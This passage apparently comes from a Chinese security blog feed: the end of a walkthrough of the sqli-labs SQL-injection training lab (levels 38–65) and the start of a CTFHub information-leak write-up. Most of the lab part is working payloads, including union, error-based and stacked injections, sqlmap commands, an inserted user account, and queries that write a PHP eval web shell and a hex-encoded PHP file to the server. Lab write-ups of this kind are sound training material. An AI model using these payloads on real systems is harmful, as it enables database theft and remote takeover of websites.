查看一下日志文件。</p><p>这里由于作者shell.php放在sqli-labs目录下，所以可以直接在浏览器上打开：</p><p><a href="http://localhost/sqli-labs/shell.php" title="http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;shell.php">http://localhost/sqli-labs/shell.php</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945729.png"></p><p>如果没放在sqli-labs目录下，但能找到所在位置，也可以直接双击shell.php打开</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945746.png"></p><p> 这里我们写入一句话木马：。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;;select &#x27;</span>&lt;<span class="hljs-meta">%3fphp</span>+<span class="hljs-meta">%40eval</span>(<span class="hljs-meta">%24_POST</span>[cmd])<span class="hljs-meta">%3b</span><span class="hljs-meta">%3f</span>&gt;<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>然后用蚁剑连接，成功getshell</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945569.png"></p><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>和上题差不多，不过是整数型注入，不需要闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<span class="hljs-keyword">insert into</span> users(id,username,password) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;26&#x27;</span>,<span class="hljs-string">&#x27;yourname&#x27;</span>,<span class="hljs-string">&#x27;meaning&#x27;</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945923.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">26</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945924.png"></p><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>四十关id参数是单引号加括号闭合，然后使用联合注入就可以了</p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>和三十九关差不多，id是整数型，不需要闭合。</p><p>和第39关唯一区别就是没有了报错信息。</p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>点forgot your password?和New User click here?都说去hack出账户出来，没什么有用信息。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945196.png"></p><p>抓包</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945154.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">login_user<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;&amp;login_password=1&#x27;</span><span class="hljs-operator">&amp;</span>mysubmit<span class="hljs-operator">=</span>Login<br></code></pre></td></tr></table></figure><p>有报错，用单引号闭合</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945050.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">login_user<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;&amp;login_password=1&#x27;</span><span class="hljs-operator">&amp;</span>mysubmit<span class="hljs-operator">=</span>Login<br></code></pre></td></tr></table></figure><p>报错消失了，说明login_user不是注入点</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945784.png"></p><p>试试login_password</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">login_user<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;&amp;login_password=1&#x27;</span><span class="hljs-operator">&amp;</span>mysubmit<span class="hljs-operator">=</span>Login<br></code></pre></td></tr></table></figure><p>有报错了，注入点是login_password</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945402.png"></p><p>login_user没报错，而login_password有报错，应该是账户进行了转义处理，而密码没有做处理，但数据库没有使用gbk编码，所以不能向上面一样使用宽字节注入。</p><p>我们可以不用login_user，在login_password注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">login_user<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>login_password<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3--+&amp;mysubmit=Login</span><br></code></pre></td></tr></table></figure><p>登录成功，2的位置有回显</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021947162.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,(select database()),3--+</span><br></code></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/a9a6d61b93fc4d219c280213ead713e2.png"></p><p>之前看到还有报错，试试报错注入，也可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">login_user<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>login_password<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))--+&amp;mysubmit=Login</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945153.png"></p><p>别忘了存在堆叠注入函数，所以我们可以在密码那里使用堆叠注入。向数据库里面插入密码账号，这样我们再来使用其进行登录就很简单了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">login_user<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>login_password<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;insert into users(id,username,password) values(&#x27;</span><span class="hljs-number">27</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">27</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">27</span><span class="hljs-string">&#x27;)--+&amp;mysubmit=Login</span><br></code></pre></td></tr></table></figure><p>登录成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945202.png"></p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>和四十二关差不多，就是密码参数是单引号和括号闭合的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;) union select 1,(select database()),3--+</span><br></code></pre></td></tr></table></figure><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>也和 Less-42 差不多，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,(select database()),3--+</span><br></code></pre></td></tr></table></figure><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>和44关区别就在于，闭合变成了’)。同样没有报错信息。</p><h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><h3 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h3><p>使用新的参数sort，通过输入1，2，3表中出现不同数据，该sql语句是order by，sql语句参数没有引号且不能使用联合注入，有报错显示，所以我们可以报错注入。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945302.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database())))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945350.png"></p><p>还可以用盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-46</span><span class="hljs-operator">/</span>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945918.png"></p><h3 id="导入文件和getshell"><a href="#导入文件和getshell" class="headerlink" title="导入文件和getshell"></a>导入文件和getshell</h3><p>发现可以将查询结果导入到文件中：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile &quot;E:\\PhPstudy\\phpstudy_pro\\WWW\\sqli-labs\\Less-46\\less46.txt&quot;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945831.png"></p><p>利用导入文件getshell（这一部分知识需要有文件上传漏洞的基础，不属于SQL注入的知识）：</p><p>lines terminated by 姿势用于 order by 的情况 getsgell。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">?sort=<span class="hljs-number">1</span> into outfile <span class="hljs-string">&quot;E:<span class="hljs-subst">\\</span>PhPstudy<span class="hljs-subst">\\</span>phpstudy_pro<span class="hljs-subst">\\</span>WWW<span class="hljs-subst">\\</span>sqli-labs<span class="hljs-subst">\\</span>46.php&quot;</span> lines terminated by <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span><br></code></pre></td></tr></table></figure><p>3c3f70687020706870696e666f28293b3f3e 是 的十六进制编码。</p><p> 访问<a href="http://localhost/sqli-labs/46.php" title="http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;46.php">http://localhost/sqli-labs/46.php</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945539.png"></p><p>作者写在46.php，查看一下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946107.png"></p><p>写入结果 ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>DumbDumb<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">2</span>AngelinaI-kill-you<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">3</span>Dummyp@ssword<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">4</span>securecrappy<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">5</span>stupidstupidity<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">6</span>supermangenious<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">7</span>batmanmob!le<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">8</span>adminadmin<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">9</span>admin1admin1<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">10</span>admin2admin2<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">11</span>admin3admin3<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">12</span>dhakkandumbo<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">14</span>admin4admin4<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">16</span>admin<span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; = &#x27;</span><span class="hljs-number">1</span><span class="hljs-number">111</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">25</span>mynamemeaning<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">26</span>yournamemeaning<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">27</span><span class="hljs-number">27</span><span class="hljs-number">27</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>和四十六差不多，多了一个单引号闭合，还是用报错注入</p><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>和四十六一样，只不过没有报错显示，要用盲注</p><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>和四十七关差不多，用单引号闭合。不过没有报错显示，所以使用盲注。</p><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>和四十六关一样，可以进行报错注入，不过这个里面还可以使用堆叠注入，因为使用了mysqli_multi_query函数，支持多条sql语句执行。也可以盲注。</p><p>堆叠的利用可以借鉴三十八关代码。</p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>该参数单引号闭合，可以报错注入，可以堆叠注入，可以盲注。</p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>该参数是整数型，且没有报错显示，只能堆叠注入或者盲注。</p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>参数是字符型，单引号闭合，没有报错显示，可以使用堆叠注入和盲注。</p><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>下面进入challenges了</p><p>用网页翻译，发现我们需要要拿到密钥并提交，而且只有十次输入机会，超过十次所有表名、列名等等都会随机重置。</p><p>Keeping it fresh at all times！！！</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946886.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>      回显DUMB的账号密码<br> <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;     无回显，不显示报错</span><br></code></pre></td></tr></table></figure><p>（后续尝试，   ?id&#x3D;1’–+      回显DUMB的账号密码）</p><p>没有报错时。不加注释无回显（此时常规情况下应该报错所以没有回显），加注释后回显（成功代替掉后面的闭合）。id参数应该是是单引号闭合。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946711.png"></p><p>根据经验，应该返回3个参数，直接爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946994.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="hljs-number">0</span>pdfwuxz90<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>注意上面这个是我查到的表名，每个人不一样的表名，payload需要用自己的表名</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946479.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,group_concat(secret_KQ9Q) from 0pdfwuxz90--+</span><br></code></pre></td></tr></table></figure><p>字段名也不一样</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946844.png"></p><p>恭喜你获得成功了（密钥也不一样）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946307.png"></p><h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>14次机会</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>      回显DUMB的账号密码<br> <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--+  无回显，不显示报错</span><br> <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;--+  无回显，不显示报错</span><br><span class="hljs-string">?id=1”--  无回显，不显示报错</span><br><span class="hljs-string">?id=1)    无回显，不显示报错</span><br><span class="hljs-string">?id=1)--+  回显DUMB的账号密码</span><br></code></pre></td></tr></table></figure><p>id参数是加了括号的整数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946779.png"></p><p>剩下的不多做赘述，14次够了</p><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>和前面两关类似，需要单引号和括号闭合。</p><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>和前几关差不多，双引号闭合</p><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>测出闭合是单引号，回显位数是3。但是这里联合注入用不了。</p><p>因为该关卡的数据不是直接数据库里面取得，而是在一个数组里面取出得。所以联合注入不行。但是有报错显示，所以可以使用报错注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema =database())))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946633.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name =&#x27;</span>bs9axfdm1g<span class="hljs-string">&#x27;)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946015.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(secret_2I9U) from bs9axfdm1g)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946604.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946502.png"></p><p>也可用盲注</p><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>和58关一样，但是是数字型，无闭合。</p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>和58关一样，闭合变成了双引号加括号”)。</p><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>和58关一样，闭合变成了单引号加两个括号’))。</p><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>这关开始没有报错信息了。闭合是单引号加括号’)’。给了130次尝试机会。</p><p>用盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946713.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--current-db</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946822.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">-</span>D challenges –<span class="hljs-operator">-</span>tables<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946010.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">-</span>D challenges –T m92drmwvjp –<span class="hljs-operator">-</span>columns<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946418.png"></p><p>再尝试发现不行，130次的次数太少了。</p><p>难道要手工盲注？那工程量也太大了。</p><p>手写脚本利用二次查找判断，以为可行但作者实际没成功，大家可以尝试一下。</p><p>其实有人已经优化了各个步骤，可以做到在130次之内（实测68次）。</p><p><a href="https://www.jianshu.com/p/f1811e108d58" title="sqli-labs靶场Less-62题解（少于130次） - 简书">sqli-labs靶场Less-62题解（少于130次） - 简书</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946266.png"></p><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>和62关一样，闭合变成了单引号’</p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>和62关一样，闭合变成了两个括号))。</p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>和62关一样，闭合变成了双引号加括号”)。</p><p>虽然页面显示还有关卡，但作者发现sqli-labs制作者做到这里就结束了。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021947177.png"></p><p><strong>后记：</strong></p><p>小伙伴们能进行到这里，真的是不容易。</p><p>祝愿大家都能在Web安全的路上越走越远。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblogs.com/peterpan0707007/p/7620048.html" title="【总结】sqli-labs Less(1-35) 小结 - Carrypan - 博客园">【总结】sqli-labs Less(1-35) 小结 - Carrypan - 博客园</a>                      </p><p><a href="https://blog.csdn.net/Jayjay___/article/details/132081414" title="【详细】 Sqli-labs1~65关 通关详解 解题思路+解题步骤+解析_sqlilabs靶场1–65过关-CSDN博客">【详细】 Sqli-labs1~65关 通关详解 解题思路+解题步骤+解析_sqlilabs靶场1–65过关-CSDN博客</a></p><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302" title="详细sqli-labs（1-65）通关讲解-CSDN博客">详细sqli-labs（1-65）通关讲解-CSDN博客</a></p><p><a href="https://www.sqlsec.com/2020/05/sqlilabs.html" title="SQLI labs 靶场精简学习记录 | 国光">SQLI labs 靶场精简学习记录 | 国光</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息泄露-CTFHub</title>
    <link href="/2025/05/04/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-CTFHub/"/>
    <url>/2025/05/04/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-CTFHub/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/142724244">https://blog.csdn.net/2302_81178149/article/details/142724244</a></p></blockquote><p>在众多的CTF平台当中，CTFHub对于初学者来说，是入门平台的不二之选。CTFHub通过自己独特的技能树模块，可以帮助初学者来快速入门。具体请看官方介绍：<a href="https://www.ctfhub.com/#/index" title="CTFHub">CTFHub</a>。</p><p> <strong>作者的CTFHub技能树汇总：</strong></p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142747270?spm=1001.2014.3001.5501" title="CTFHub技能树Web汇总-CSDN博客">CTFHub技能树Web汇总-CSDN博客</a></p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>一、wp</p><p>挨个对里面的目录进行寻找，但是flag每次出现的位置都随机，多找找就可以发现，最终可以在某个目录中找到flag</p><p>二、题目考点</p><p>由于配置错误导致网站的目录可被遍历，一般该类漏洞可以为后续利用提供一些信息上的帮助</p><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>一、wp</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912983.png"></p><p>点击查看</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021912070.png"></p><p>用Ctrl+F查找flag必有的ctfhub{，找到flag。</p><p>（作者发现这里面有两个位置有flag，不过是一模一样的）</p><p><img 